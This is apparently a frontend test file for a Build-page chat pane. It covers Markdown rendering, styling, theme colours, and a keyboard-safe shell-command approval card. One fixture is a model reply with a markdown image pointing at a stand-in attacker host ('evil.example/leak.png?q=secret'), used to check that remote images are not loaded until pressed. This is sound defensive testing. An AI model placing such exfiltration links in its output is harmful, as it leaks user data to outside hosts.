/**
 * v1.329.0 (calm chat wave 4, F5) — the Build page side chat (PaneChat).
 *
 *  1. SAFE MARKDOWN: a reply renders through the app's ONE renderer
 *     (components/Markdown.tsx), so a model-written image URL waits for a
 *     press (RemoteMediaGate), a ```chart fence draws a chart, and a table
 *     reads as part of the text (hairline rows, no grid). react-markdown is
 *     NOT mocked here: the real pipeline is the thing under test.
 *  2. CALM LOOK: the reply has no box, your message is a tinted bubble with
 *     no border, and ONE composer card holds the box, the Engine chip and a
 *     round send button.
 *  3. AN APPROVAL TAKES THE COMPOSER'S PLACE, and answers keys only while the
 *     focus is inside it: a pane hidden behind its terminal must never allow
 *     a command on an Enter the user typed somewhere else.
 *  4. DAYLIGHT: the chat layer and the pane frame use theme tokens; only the
 *     terminal canvas stays dark.
 */

import { readFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";

const H = vi.hoisted(() => {
  class FakeApiError extends Error {
    status: number;
    constructor(message: string, status = 500) {
      super(message);
      this.status = status;
      this.name = "ApiError";
    }
  }
  return {
    FakeApiError,
    api: {
      posts: [] as { path: string; body: Record<string, unknown> }[],
      threads: {} as Record<string, unknown>,
    },
  };
});

vi.mock("@/lib/api", () => ({
  ApiError: H.FakeApiError,
  API_BASE: "http://127.0.0.1:8787",
  ijToken: () => "",
  get: async (path: string) => {
    if (path === "/projects") return { projects: [] };
    if (path === "/undo?session_id=chat") return { actions: [] };
    const m = /^\/chat\/threads\/(.+)$/.exec(path);
    if (m) {
      const t = H.api.threads[decodeURIComponent(m[1])];
      if (!t) throw new H.FakeApiError("thread not found", 404);
      return t;
    }
    throw new H.FakeApiError(`unexpected GET ${path}`, 500);
  },
  post: async (path: string, body: Record<string, unknown>) => {
    H.api.posts.push({ path, body });
    return { ok: true };
  },
  put: async () => ({ id: "th_1", title: "t" }),
}));

const S = vi.hoisted(() => ({
  stream: {
    approval: null as Record<string, unknown> | null,
  },
}));

vi.mock("@/lib/useChatStream", () => ({
  useLiveText: (s: { text?: string }) => s?.text ?? "",
  StreamError: class extends Error {},
  useChatStream: () => ({
    streaming: false,
    text: "",
    tools: [],
    approval: S.stream.approval,
    run: async () => ({ reply: "ok" }),
    abort: () => {},
  }),
}));

vi.mock("@/lib/daemon", () => ({
  useDaemon: () => ({
    online: true,
    unauthorized: false,
    requestError: false,
    checking: false,
    refresh: () => {},
    health: {
      status: "ok",
      version: "test",
      default_provider: "mock",
      default_model: "m",
      providers: [{ provider: "lmstudio", available: true, class: "local" }],
    },
  }),
}));

import { PaneChat } from "@/components/terminal/PaneChat";
import { PANE_ASK_ARM_MS, PaneAsk } from "@/components/terminal/PaneAsk";
import { DOCK_KEY_ARM_MS } from "@/components/chat/DockAsk";

const CWD = "C:\\work\\demo";
const read = (...p: string[]) =>
  readFileSync(join(process.cwd(), ...p), "utf8").replace(/\r\n/g, "\n");

/** Open the pane on a stored thread holding these two messages. */
function withThread(user: string, reply: string) {
  window.localStorage.setItem("ij.pane.thread.p1", "th_1");
  H.api.threads.th_1 = {
    id: "th_1",
    messages: [
      { role: "user", content: user },
      { role: "assistant", content: reply },
    ],
    setup: null,
  };
}

const APPROVAL = { id: "apr_1", callId: "c1", tool: "shell", args: { command: "npm test" } };

beforeEach(() => {
  H.api.posts = [];
  H.api.threads = {};
  S.stream.approval = null;
  window.localStorage.clear();
});
afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

/* ------------------------------------------------------------ 1. markdown */

describe("the pane renders replies through the shared Markdown", () => {
  it("a model-written remote image waits for a press (no request on render)", async () => {
    withThread("show me", "Here it is: ![chart](https://evil.example/leak.png?q=secret)");
    render(<PaneChat paneId="p1" cwd={CWD} />);
    const gate = await screen.findByTestId("remote-media-gate");
    expect(gate.textContent).toContain("evil.example");
    expect(document.querySelector('img[src^="https://evil.example"]')).toBeNull();
  });

  it("a ```chart fence draws a chart, not raw JSON", async () => {
    const spec = JSON.stringify({
      type: "bar",
      title: "Q3",
      labels: ["Jul", "Aug"],
      series: [{ name: "Harbor St", values: [41200, 43800] }],
    });
    withThread("chart it", "Revenue:\n\n```chart\n" + spec + "\n```\n");
    render(<PaneChat paneId="p1" cwd={CWD} />);
    expect(await screen.findByTestId("chart-card")).toBeInTheDocument();
  });

  it("a table reads as part of the text: hairline rows, no grid, no filled header", async () => {
    withThread("table", "| Location | Jul |\n| --- | --- |\n| Harbor St | 41,200 |\n");
    render(<PaneChat paneId="p1" cwd={CWD} />);
    const table = await screen.findByTestId("md-table");
    const reply = screen.getByTestId("pane-reply");
    expect(reply).toContainElement(table);
    for (const cls of ["[&_td]:border-x-0", "[&_th]:border-x-0", "[&_th]:bg-transparent"]) {
      expect(reply.className).toContain(cls);
    }
  });

  it("the pane no longer runs a markdown renderer of its own (source)", () => {
    const src = read("components", "terminal", "PaneChat.tsx");
    expect(src).not.toMatch(/from "react-markdown"/);
    expect(src).toMatch(/import \{ Markdown, MemoMarkdown \} from "@\/components\/Markdown"/);
  });
});

/* ------------------------------------------------------------ 2. the look */

describe("the calm look at pane scale", () => {
  it("your message is a tinted bubble with no border; the reply has no box", async () => {
    withThread("fix the test", "Done.");
    render(<PaneChat paneId="p1" cwd={CWD} />);
    const bubble = await screen.findByTestId("pane-user-bubble");
    expect(bubble.className).toContain("bg-accent/[0.1]");
    expect(bubble.className).not.toMatch(/\bborder\b|\bborder-/);
    // The reply's own box: no border, corner or fill on the element itself
    // (the `[&_td]:…` table rules are about rows inside it, not a box).
    const own = screen.getByTestId("pane-reply").className.split(/\s+/).filter((c) => !c.startsWith("["));
    expect(own.filter((c) => /^(border|rounded|bg-)/.test(c))).toEqual([]);
  });

  it("ONE composer card holds the box, the Engine chip and the round send button", async () => {
    render(<PaneChat paneId="p1" cwd={CWD} />);
    const card = screen.getByTestId("pane-chat-composer");
    const box = within(card).getByLabelText("Message");
    const engine = within(card).getByLabelText("Engine");
    const send = within(card).getByLabelText("Send");
    expect(engine.tagName).toBe("SELECT");
    // The box and the chip carry no border of their own: the card's hairline
    // is the only edge.
    expect(box.className).not.toMatch(/\bborder\b|\bborder-/);
    expect(engine.className).not.toMatch(/\bborder\b|\bborder-/);
    expect(send.className).toContain("rounded-full");
    // No line above the composer area.
    expect(card.parentElement?.className ?? "").not.toContain("border-t");
    // The chip says the pick in words, and follows a new pick.
    const chip = within(card).getByTestId("pane-chat-engine");
    expect(chip).toContainElement(engine);
    // The words on the chip (the select's own options are invisible).
    const words = () => chip.firstElementChild?.textContent ?? "";
    expect(words()).toBe("Default");
    fireEvent.change(engine, { target: { value: "lmstudio" } });
    await waitFor(() => expect(words()).not.toBe("Default"));
    expect(words()).toBe(engine.querySelector('option[value="lmstudio"]')?.textContent);
    // Quiet until there is something to send; the accent once there is.
    expect(send.className).not.toContain("btn-accent");
    fireEvent.change(box, { target: { value: "hello" } });
    await waitFor(() => expect(send.className).toContain("btn-accent"));
  });
});

/* -------------------------------------------- 3. the approval in the dock */

describe("an approval takes the composer's place", () => {
  it("draws the card in the dock (not the transcript) and hides the composer, keeping the draft", async () => {
    const { rerender } = render(<PaneChat paneId="p1" cwd={CWD} />);
    fireEvent.change(screen.getByLabelText("Message"), { target: { value: "half typed" } });
    S.stream.approval = APPROVAL;
    rerender(<PaneChat paneId="p1" cwd={CWD} />);
    const dock = screen.getByTestId("pane-ask");
    expect(within(dock).getByTestId("chat-approval-card")).toBeInTheDocument();
    expect(within(screen.getByTestId("pane-chat-transcript")).queryByTestId("chat-approval-card")).toBeNull();
    const composer = screen.getByTestId("pane-chat-composer");
    expect(composer.className.split(/\s+/)).toContain("hidden");
    expect(composer.hasAttribute("inert")).toBe(true);
    // Answered: the composer comes back with the words as they were.
    S.stream.approval = null;
    rerender(<PaneChat paneId="p1" cwd={CWD} />);
    expect(screen.queryByTestId("pane-ask")).toBeNull();
    expect(screen.getByTestId("pane-chat-composer").className.split(/\s+/)).not.toContain("hidden");
    expect(screen.getByLabelText("Message")).toHaveValue("half typed");
  });

  it("takes the focus from this pane's composer, and gives it back when answered", async () => {
    const { rerender } = render(<PaneChat paneId="p1" cwd={CWD} />);
    const box = screen.getByLabelText("Message");
    box.focus();
    S.stream.approval = APPROVAL;
    rerender(<PaneChat paneId="p1" cwd={CWD} />);
    await waitFor(() => expect(document.activeElement).toBe(screen.getByTestId("pane-ask")));
    S.stream.approval = null;
    rerender(<PaneChat paneId="p1" cwd={CWD} />);
    await waitFor(() => expect(document.activeElement).toBe(screen.getByLabelText("Message")));
  });

  it("never takes the focus from somewhere else (a terminal, another field)", async () => {
    const outside = document.createElement("textarea");
    outside.setAttribute("aria-label", "terminal input");
    document.body.appendChild(outside);
    try {
      const { rerender } = render(<PaneChat paneId="p1" cwd={CWD} />);
      outside.focus();
      S.stream.approval = APPROVAL;
      rerender(<PaneChat paneId="p1" cwd={CWD} />);
      await screen.findByTestId("pane-ask");
      expect(document.activeElement).toBe(outside);
    } finally {
      outside.remove();
    }
  });

  it("Enter inside the card presses Allow once, but only after the arm delay", async () => {
    let now = 1_000_000;
    vi.spyOn(Date, "now").mockImplementation(() => now);
    S.stream.approval = APPROVAL;
    render(<PaneChat paneId="p1" cwd={CWD} />);
    const dock = await screen.findByTestId("pane-ask");
    // Straight away: an Enter typed for the composer must not allow a
    // command the user has not read yet.
    fireEvent.keyDown(dock, { key: "Enter" });
    expect(H.api.posts.find((p) => p.path === "/chat/approvals/apr_1")).toBeUndefined();
    now += PANE_ASK_ARM_MS + 1;
    fireEvent.keyDown(dock, { key: "Enter" });
    await waitFor(() =>
      expect(H.api.posts.find((p) => p.path === "/chat/approvals/apr_1")?.body).toEqual({
        decision: "once",
      }),
    );
  });

  it("Esc inside the card presses Deny", async () => {
    let now = 2_000_000;
    vi.spyOn(Date, "now").mockImplementation(() => now);
    S.stream.approval = APPROVAL;
    render(<PaneChat paneId="p1" cwd={CWD} />);
    const dock = await screen.findByTestId("pane-ask");
    now += PANE_ASK_ARM_MS + 1;
    fireEvent.keyDown(dock, { key: "Escape" });
    await waitFor(() =>
      expect(H.api.posts.find((p) => p.path === "/chat/approvals/apr_1")?.body).toEqual({
        decision: "deny",
      }),
    );
  });

  it("a key pressed OUTSIDE the card answers nothing (a hidden pane must never allow on a stray Enter)", async () => {
    let now = 3_000_000;
    vi.spyOn(Date, "now").mockImplementation(() => now);
    S.stream.approval = APPROVAL;
    render(<PaneChat paneId="p1" cwd={CWD} />);
    await screen.findByTestId("pane-ask");
    now += PANE_ASK_ARM_MS + 1;
    (document.activeElement as HTMLElement | null)?.blur?.();
    act(() => {
      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
      document.body.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
    });
    await new Promise((r) => setTimeout(r, 20));
    expect(H.api.posts.find((p) => p.path === "/chat/approvals/apr_1")).toBeUndefined();
  });

  it("waits as long as the chat page's dock does", () => {
    expect(PANE_ASK_ARM_MS).toBe(DOCK_KEY_ARM_MS);
  });

  it("'Allow for this conversation' still reaches the pane's grant path", async () => {
    const onConversation = vi.fn();
    render(<PaneAsk approval={APPROVAL as never} onConversation={onConversation} />);
    fireEvent.click(screen.getByRole("button", { name: /allow for this conversation/i }));
    await waitFor(() => expect(onConversation).toHaveBeenCalledWith("shell"));
  });
});

/* ------------------------------------------------------------- 4. Daylight */

describe("Daylight: the chat area uses theme tokens", () => {
  it("the Build page's chat layer has no literal dark colour", () => {
    const page = read("app", "terminals", "page.tsx");
    const at = page.indexOf("data-testid={`chat-layer-${t.id}`}");
    expect(at).toBeGreaterThan(-1);
    const layer = page.slice(at, at + 500);
    expect(layer).toContain("bg-ink-900");
    expect(layer).not.toMatch(/bg-\[#/);
  });

  it("the pane frame follows the theme; only the terminal canvas stays dark", () => {
    const pane = read("components", "terminal", "TerminalPane.tsx");
    const frame = pane.indexOf("group relative flex h-full flex-col overflow-hidden rounded-2xl border");
    expect(frame).toBeGreaterThan(-1);
    const frameLine = pane.slice(frame, pane.indexOf("\n", frame));
    expect(frameLine).toContain("bg-ink-900");
    expect(frameLine).not.toMatch(/bg-\[#/);
    // The canvas the terminal draws on keeps its dark ground (xterm's own
    // palette is dark), so the padding around it never shows a light edge.
    expect(pane).toContain('<div className="relative flex-1 overflow-hidden bg-[#0a0c11] px-2 py-1.5">');
  });

  it("the pane chat and its look carry no literal colours", () => {
    for (const f of ["PaneChat.tsx", "PaneAsk.tsx", "paneChatLook.ts"]) {
      const src = read("components", "terminal", f);
      expect(src, f).not.toMatch(/(?:bg|text|border|ring)-\[#/);
    }
  });
});
